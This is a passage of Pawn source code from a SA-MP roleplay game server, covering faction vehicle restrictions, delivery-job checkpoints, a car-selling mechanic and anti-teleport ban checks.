	       	SetPVarInt(playerid, "ToBeEjected", 0);
	       	RemovePlayerFromVehicle(playerid);
	       	new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPlayerPos(playerid, X, Y, Z+2);

			if(GetPVarInt(playerid, "Injured") == 1)
  			{
  			    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
		   		SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
				SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));
   				ClearAnimations(playerid, 1);
				ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
   			}
   		}

   		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
  		if(GetCarDealershipVehicleId(newcar) != -1 && GetCarDealershipVehicleId(newcar) == GetPVarInt(playerid, "editingcdveh")) return 1;
        if(GetCarDealershipVehicleId(newcar) != -1)
        {
			new string[57 + 20 + 4];
			format(string, sizeof(string),"Would you like to buy this %s?\n\nThis vehicle costs $%d.", GetVehicleName(newcar), CarDealershipInfo[GetCarDealershipId(newcar)][cdVehicleCost][GetCarDealershipVehicleId(newcar)]);
		    ShowPlayerDialogEx(playerid,DIALOG_CDBUY,DIALOG_STYLE_MSGBOX,"Warning:",string,"Buy","Cancel");
		    TogglePlayerControllable(playerid, false);
		    return 1;
        }

 		foreach(Player, i)
	 	{
			v = GetPlayerVehicle(i, newcar);
			if(v != -1) {
				if(i == playerid) {

					new
						string[96];

					format(string, sizeof(string),"You're the owner of this %s.", GetVehicleName(newcar));
					SendClientMessage(playerid, COLOR_GREY, string);
					if(PlayerVehicleInfo[i][v][pvTicket] != 0)
					{
						format(string, sizeof(string),"A $%d parking ticket was left on your vehicle. You must pay the ticket at the DMV in Dilimore.", PlayerVehicleInfo[i][v][pvTicket]);
						SendClientMessage(playerid, COLOR_GREY, string);
						SendClientMessage(playerid, COLOR_GREY, "Failure to pay this ticket as soon as possible will result in a fine, or even an arrest.");
					}
				}
				else if(i == PlayerInfo[playerid][pVehicleKeysFrom]) {

					new
						string[64 + MAX_PLAYER_NAME];

					format(string, sizeof(string),"You have the keys for this %s from owner %s.", GetVehicleName(newcar), GetPlayerNameEx(i));
					SendClientMessage(playerid, COLOR_GREY, string);
				}
				else if(PlayerVehicleInfo[i][v][pvLocked] == 1 && PlayerVehicleInfo[i][v][pvLock] == 1) {
				    GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(newcar,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
					SetTimerEx("DisableVehicleAlarm", 20000, 0, "d",  newcar);
				}
				/*else if(PlayerVehicleInfo[i][v][pvLocked] == 1 && PlayerVehicleInfo[i][v][pvLock] == 2) {

					new
						string[49 + MAX_PLAYER_NAME];

	          		if(PlayerInfo[playerid][pAdmin] < 2)
					{
						format(string, sizeof(string), "* %s has been stunned by the electric anti-theft.",GetPlayerNameEx(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						new Float:X, Float:Y, Float:Z, Float:HP;
	     				GetPlayerPos(playerid, X, Y, Z);
						//SendAudioToRange(64, 100, X, Y, Z, 20.0);
	     				SetPlayerPos(playerid, X + 1, Y, Z);
	         			RemovePlayerFromVehicle(playerid);
	         			SetPVarInt(playerid, "IsFrozen", 1);
	            		TogglePlayerControllable(playerid,0);
		            	SetTimerEx("ReleasePlayer", 10000, 0, "d", playerid);
			            GameTextForPlayer(playerid,"~r~STUNNED!",11000,3);
			            GetPlayerHealth(playerid,HP);
			            SetPlayerHealth(playerid,HP-15);
					}
					else
					{
	    				format(string, sizeof(string), "Warning: This %s is owned by %s.", GetVehicleName(newcar), GetPlayerNameEx(i));
	      				SendClientMessage(playerid, COLOR_GREY, string);
					}
				}*/
				return 1;
			}
		}

		for(new f = 0; f < MAX_FAMILY; f++) {
			v = GetGangVehicle(f, newcar);
			if(v != -1) {
				new string[49 + MAX_PLAYER_NAME];
				if(PlayerInfo[playerid][pGang] == f)
				{
					format(string, sizeof(string), "You're in the family that owns this %s.", GetVehicleName(newcar));
	    			SendClientMessage(playerid, COLOR_GREY, string);
				}
				else if(FamilyVehicleInfo[f][v][fvLocked] == 1 && FamilyVehicleInfo[f][v][fvLock] == 1)
				{
					GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(newcar,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
					SetTimerEx("DisableVehicleAlarm", 20000, 0, "d",  newcar);
				}
				/*else if(FamilyVehicleInfo[f][v][fvLocked] == 1 && FamilyVehicleInfo[f][v][fvLock] == 2)
				{
		            format(string, sizeof(string), "* %s has been stunned by the electric anti-theft.",GetPlayerNameEx(playerid));
		            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		            new Float:X, Float:Y, Float:Z, Float:HP;
		            GetPlayerPos(playerid, X, Y, Z);
					//SendAudioToRange(64, 100, X, Y, Z, 20.0);
		            SetPlayerPos(playerid, X + 1, Y, Z);
		            RemovePlayerFromVehicle(playerid);
		            new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
					SetPVarInt(playerid, "IsFrozen", 1);
		            TogglePlayerControllable(playerid,0);
		            SetTimerEx("ReleasePlayer", 10000, 0, "d", playerid);
		            GameTextForPlayer(playerid,"~r~STUNNED!",11000,3);
		            GetPlayerHealth(playerid,HP);
		            SetPlayerHealth(playerid,HP-15);
				}*/
				return 1;
			}
		}

		new vehicleid = GetPlayerVehicleID(playerid);

	 	if(IsACopCar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 1||PlayerInfo[playerid][pLeader] == 1)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the LSPD!");
			}
		}
		else if(IsAFBICar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 2||PlayerInfo[playerid][pLeader] == 2)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the FBI!");
			}
		}
		else if(vehicleid == LSFMDVehicles[12] || vehicleid == LSFMDVehicles[33] || vehicleid == LSFMDVehicles[34] || vehicleid == LSFMDVehicles[35]) {
		    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 3) { }
			else {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the Fire Department Division!");
			}
		}
		else if(vehicleid == LSFMDVehicles[13] || vehicleid == LSFMDVehicles[16] || vehicleid == LSFMDVehicles[36] || vehicleid == LSFMDVehicles[37] || vehicleid == LSFMDVehicles[38] || vehicleid == LSFMDVehicles[39] || vehicleid == LSFMDVehicles[40]) {
		    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) { }
			else {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the Life Flight Division!");
			}
		}
		else if(IsANewsVeh(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 9||PlayerInfo[playerid][pLeader] == 9)
			{
				if(GetVehicleModel(vehicleid) == 488 && PlayerInfo[playerid][pRank] < 3) {
				    RemovePlayerFromVehicle(playerid);
				    new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
				    NOPCheck(playerid);
				    SendClientMessage(playerid, COLOR_GRAD2, "You must be Rank 3 or higher to pilot this helicopter.");
				}
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the San Andreas News faction!");
			}
		}
		/*else if(IsAGovCar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 5||PlayerInfo[playerid][pLeader] == 5)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "You're not in the Government!");
			}
		}*/
 		else if(IsAPlane(vehicleid))
		{
	  		if(PlayerInfo[playerid][pFlyLic] != 1)
	  		{
		  		RemovePlayerFromVehicle(playerid);
		  		new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		  		NOPCheck(playerid);
			 	SendClientMessage(playerid,COLOR_GREY,"You don't have a pilot license!");
	  		}
		}
		else if(IsAHelicopter(vehicleid))
		{
		    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
			GivePlayerValidWeapon(playerid, 46, 60000);
		}
		else if(IsAnTaxi(vehicleid) || IsAnBus(vehicleid))
		{
	        if(PlayerInfo[playerid][pJob] == 17 || PlayerInfo[playerid][pJob2] == 17)
			{
			}
		    else
			{
		        SendClientMessage(playerid,COLOR_GREY,"   You're not a Taxi/Bus Driver!");
		        RemovePlayerFromVehicle(playerid);
		        new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		    }
		}
	}
	if(newstate == PLAYER_STATE_SPAWNED)
	{
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		//gPlayerSpawned[playerid] = 1;
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(GetPVarInt(playerid,"TrackCar") != 0)
	{
	    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
	    DisablePlayerCheckpoint(playerid);
		DeletePVar(playerid, "TrackCar");
		return 1;
	}
	if(GetPVarInt(playerid, "TruckDeliver") > 0 && gPlayerCheckpointStatus[playerid] != CHECKPOINT_RETURNTRUCK)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "You're not in a Truck!");
	        return 1;
	    }
	    if(TruckUsed[playerid] != INVALID_VEHICLE_ID && vehicleid != TruckUsed[playerid])
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "This is not your Truck with the goods you're suppose to deliver!");
	        return 1;
	    }

		if(!IsAtTruckDeliveryPoint(playerid))
 		{// In the case the player finds a way to exploit the checkpoint to different location
			CancelTruckDelivery(playerid);
			SendClientMessage(playerid, COLOR_REALRED, "ERROR: Wrong checkpoint entered. Truck delivery canceled completely.");
			return 1;
   		}

		if(GetPVarInt(playerid, "tpTruckRunTimer") != 0) {
  			new string[128];
			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport truckrunning.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s was possibly teleport truckrunning.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

			SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  			if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  			{
   				format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", string);
   				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
			return 1;
		}

		new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
		TruckContents[vehicleid] = 0;

		if(truckdeliver >= 1 && truckdeliver <= 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the food & beverages, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver >= 4 && truckdeliver <= 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the clothing, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the materials, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver >= 8 && truckdeliver <= 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the 24/7 items, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the weapons, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the drugs, return the truck to Easter Basin to collect your pay.");
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You delivered the illegal materials, return the truck to Easter Basin to collect your pay.");
		}
		DisablePlayerCheckpoint(playerid);

		gPlayerCheckpointStatus[playerid] = CHECKPOINT_RETURNTRUCK;
		SetPlayerCheckpoint(playerid, -1547.66,124.64,3.55, 5);
		GameTextForPlayer(playerid, "~w~Waypoint set ~r~Easter Basin", 5000, 1);
		SendClientMessage(playerid, COLOR_WHITE, "HINT: Return to Easter basin (see checkpoint on radar).");

		SetPVarInt(playerid, "tpTruckRunTimer", 30);
		SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
		return 1;
	}
    else if(GetPVarInt(playerid, "Pizza") > 0 && IsPlayerInRangeOfPoint(playerid, 5.0, HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorX], HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorY], HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorZ]))
	{
	    new string[128];
		if(GetPVarInt(playerid, "tpPizzaTimer") != 0)
		{
			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly teleport pizzarunning.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s was possibly teleport pizzarunning.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

    		// format(string, sizeof(string), "%s (ID %d) is possibly teleport pizzarunning.", GetPlayerNameEx(playerid), playerid);
	    	// Log("logs/hack.log", string);
	    	format(string, sizeof(string), "You have delivered the pizza to the destination! You have made $%d.", (GetPVarInt(playerid, "pizzaTimer") * 2));
	    	SendClientMessage(playerid, COLOR_WHITE, string);
   			SetPVarInt(playerid, "Pizza", 0);
			DisablePlayerCheckpoint(playerid);

			SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  			if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  			{
   				format(string, sizeof(string), "AdmCmd: %s has been banned, reason: Teleport hacking.", GetPlayerNameEx(playerid));
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdmCmd: %s (IP:%s) was banned, reason: Teleport hacking.", GetPlayerNameEx(playerid), playerip);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", string);
   				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
	    	return 1;
		}
		DestroyProgressBar(PizzaBar[playerid]);
		format(string, sizeof(string), "You have delivered the pizza to the destination! You have made $%d.", (GetPVarInt(playerid, "pizzaTimer") * 2));
		//Tax -= (GetPVarInt(playerid, "pizzaTimer") * 70);
		//Misc_Save();
		GivePlayerCash(playerid, floatround((GetPVarInt(playerid, "pizzaTimer") * 2), floatround_round));
		SendClientMessage(playerid, COLOR_WHITE, string);
		SetPVarInt(playerid, "Pizza", 0);
		DisablePlayerCheckpoint(playerid);

	}
	else if(FindingJob[playerid] != 0)
	{
		switch (FindingJob[playerid])
		{
		    case 1: SendClientMessage(playerid, COLOR_WHITE, "The Detective Job is inside this building. Type /enter to go inside.");
		    case 2: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Lawyer Job. Type /join to get this job.");
		    case 3: SendClientMessage(playerid, COLOR_WHITE, "The Whore Job is inside this building. Type /enter to go inside.");
		    case 4: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Drug Dealer Job. Type /join to get this job.");
		    case 5: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Car Mechanic Job. Type /join to get this job.");
		    case 6: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Bodyguard Job. Type /join to get this job.");
		    case 7: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Arms Dealer Job. Type /join to get this job.");
		    case 8: SendClientMessage(playerid, COLOR_WHITE, "The Boxer Job is inside this building. Type /enter to go inside.");
		    case 9: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Drug Smuggler Job. Type /join to get this job.");
		    case 10: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Taxi Driver Job. Type /join to get this job.");
		    case 11: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Craftsman Job. Type /join to get this job.");
		    case 12: SendClientMessage(playerid, COLOR_WHITE, "The Bartender Job is inside this building. Type /enter to go inside.");
		    case 13: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Trucker Job. Type /join to get this job.");
		    case 14: SendClientMessage(playerid, COLOR_WHITE, "The Pizza Boy Job is outside this building. Type /join to get this job.");
		    case 15: SendClientMessage(playerid, COLOR_WHITE, "You have arrived at the Fisher Job. You can /fish at this pier or on boats.");
		}
		DisablePlayerCheckpoint(playerid);
		FindingJob[playerid] = 0;
	}
	else if(FindingDealership[playerid] != 0)
	{
		DisablePlayerCheckpoint(playerid);
		FindingDealership[playerid] = 0;
	}
	else if(CP[playerid] == 1)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new
				vehicleid = GetPlayerVehicleID(playerid);

  			foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, vehicleid);
                if(v != -1)
				{
    				CP[playerid] = 0;
    				DisablePlayerCheckpoint(playerid);
					GameTextForPlayer(playerid, "~r~Vehicle denied", 5000, 1);
					SendClientMessage(playerid, COLOR_WHITE, "You can't sell vehicles owned by players or families.");
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, vehicleid);
                if(v != -1)
                {
					CP[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					GameTextForPlayer(playerid, "~r~Vehicle denied", 5000, 1);
					SendClientMessage(playerid, COLOR_WHITE, "You can't sell vehicles owned by players or families.");
                    return 1;
                }
			}

			new string[128];

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pCarSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pCarSkill]++;
				}
			#else
				PlayerInfo[playerid][pCarSkill] ++;
			#endif

			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(strcmp(Points[i][Name], "Auto Export Company", true) == 0)
				{
					mypoint = i;
				}
			}
			if(PlayerInfo[playerid][pCarSkill] == 50)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 2, you will earn more Money and quicker Reload Time."); }
			else if(PlayerInfo[playerid][pCarSkill] == 100)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 3, you will earn more Money and quicker Reload Time."); }
			else if(PlayerInfo[playerid][pCarSkill] == 200)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 4, you will earn more Money and quicker Reload Time."); }
			else if(PlayerInfo[playerid][pCarSkill] == 400)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Car Jack Skill is now Level 5, you will earn more Money and quicker Reload Time."); }
			new level = PlayerInfo[playerid][pCarSkill];
			if(level >= 0 && level < 50)
			{
				new rand = random(sizeof(SELLCAR1));
				format(string, sizeof(string), "You sold a car for $%d, your reload time is 20 minutes.", SELLCAR1[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR1[rand]);
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				PlayerInfo[playerid][pCarTime] = 1200;
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR1[rand]/2);
					}
				}
			}
			else if(level >= 50 && level < 100)
			{
				new rand = random(sizeof(SELLCAR2));
				format(string, sizeof(string), "You sold a car for $%d, your reload time is 18 minutes.", SELLCAR2[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR2[rand]);
				PlayerInfo[playerid][pCarTime] = 1080;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR2[rand]/2);
					}
				}
			}
			else if(level >= 100 && level < 200)
			{
				new rand = random(sizeof(SELLCAR3));
				format(string, sizeof(string), "You sold a car for $%d, your reload time is 16 minutes.", SELLCAR3[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR3[rand]);
				PlayerInfo[playerid][pCarTime] = 960;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR3[rand]/2);
					}
				}
			}
			else if(level >= 200 && level < 400)
			{
				new rand = random(sizeof(SELLCAR4));
				format(string, sizeof(string), "You sold a car for $%d, your reload time is 14 minutes.", SELLCAR4[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR4[rand]);
				PlayerInfo[playerid][pCarTime] = 840;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR4[rand]/2);
					}
				}
			}
			else if(level >= 400)
			{
				new money = 600;
				format(string, sizeof(string), "You sold a car for $%d, your reload time is 12 minutes.", money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, money);
  				PlayerInfo[playerid][pCarTime] = 720;
 				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(money/2);
					}
				 }
			}
			GameTextForPlayer(playerid, "~y~Sold the car", 2500, 1);
			CP[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			if(GetVehicleModel(vehicleid)==525&&IsTrailerAttachedToVehicle(vehicleid))
			{
				SetVehicleToRespawn(GetVehicleTrailer(vehicleid));
			}
			else
			{
				SetVehicleToRespawn(vehicleid);
			}

			SetTimerEx("RespawnVehicleFunction", 3000, false, "d", gLastCar[playerid]);
		}
		else
		{
		    CP[playerid] = 0;
			GameTextForPlayer(playerid, "Not in a car", 5000, 1);
			DisablePlayerCheckpoint(playerid);
		}
	}

	if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
	{
		TaxiAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
		TaxiCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(EMSCallTime[playerid] > 0 && EMSAccepted[playerid] < INVALID_PLAYER_ID)
	{
	    if(GetPVarInt(EMSAccepted[playerid], "Injured") == 1)
	    {
	    	SendEMSQueue(EMSAccepted[playerid],2);
	    	EMSAccepted[playerid] = INVALID_PLAYER_ID;
	    	GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
	    	EMSCallTime[playerid] = 0;
	    	DisablePlayerCheckpoint(playerid);
		}
		else
		{
            EMSAccepted[playerid] = INVALID_PLAYER_ID;
		    GameTextForPlayer(playerid, "~r~Patient has died", 5000, 1);
		    EMSCallTime[playerid] = 0;
	    	DisablePlayerCheckpoint(playerid);
		}
	}
	else if(BusCallTime[playerid] > 0 && BusAccepted[playerid] < 999)
	{
		BusAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Reached destination", 5000, 1);
		BusCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else if(MedicCallTime[playerid] > 0 && MedicAccepted[playerid] < 999)
	{
		MedicAccepted[playerid] = 999;
		GameTextForPlayer(playerid, "~w~Reached patient", 5000, 1);
		MedicCallTime[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	}
	else
	{
		switch (gPlayerCheckpointStatus[playerid])
		{
			case CHECKPOINT_HOME:
			{
				PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				new i = hInviteHouse[playerid];
				DisablePlayerCheckpoint(playerid);
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
    			Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
				SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
				if(HouseInfo[i][hCustomInterior] == 1)
				{
			    	LoadObjectsForPlayer(playerid);
		        }
				SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
				GameTextForPlayer(playerid, "~w~Welcome Home", 5000, 1);
				PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
				PlayerInfo[playerid][pVW] = i+60000;
				SetPlayerVirtualWorld(playerid, i+60000);
				hInviteOffer[playerid] = 999;
				hInviteHouse[playerid] = INVALID_HOUSE_ID;
			}
			case CHECKPOINT_LOADTRUCK:
			{
			    if(IsPlayerInRangeOfPoint(playerid, 6, -1578.29, 74.80, 3.55))
			    {
				    new vehicleid = GetPlayerVehicleID(playerid);
	   				if(IsATruckerCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    		{
				    	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);
				    	DisablePlayerCheckpoint(playerid);
				    	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
						TogglePlayerControllable(playerid, 0);
						SetPVarInt(playerid, "IsFrozen", 1);
						ShowPlayerDialogEx(playerid,DIALOG_LOADTRUCK,DIALOG_STYLE_LIST,"What do you want to transport?","{00F70C}Legal goods {FFFFFF}(no risk but also no bonuses)\n{FF0606}Illegal goods {FFFFFF}(risk of getting caught but a bonus)","Select","Cancel");
					}
					else return SendClientMessage(playerid, COLOR_GREY, "You're not driving a Truck!");
				}
			}
			case CHECKPOINT_RETURNTRUCK:
